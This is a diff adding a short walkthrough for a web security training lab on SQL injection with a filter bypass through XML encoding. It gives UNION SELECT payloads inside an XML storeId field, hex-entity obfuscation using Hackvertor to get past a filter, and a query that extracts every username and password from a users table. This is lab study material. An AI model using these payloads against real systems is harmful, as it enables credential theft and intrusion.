@@ -527,7 +527,15 @@ The web page performs a GET request with the parameter title when searching for 
 
 
 
-
+ Lab: SQL injection with filter bypass via XML encoding
+ Payload: 
+ STEP 1: Try determining the number of columns returned by the original query by appending a UNION SELECT statement to the original store ID: 
+        <storeId>1 UNION SELECT NULL</storeId>
+ STEP 2: As you're injecting into XML, try obfuscating your payload using XML entities. One way to do this is using the Hackvertor extension. Just highlight your input, right-click, then select Extensions > Hackvertor > Encode > dec_entities/hex_entities.
+ STEP 3: As you can only return one column, you need to concatenate the returned usernames and passwords, for example: 
+        <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
+        
+        
 
 
 
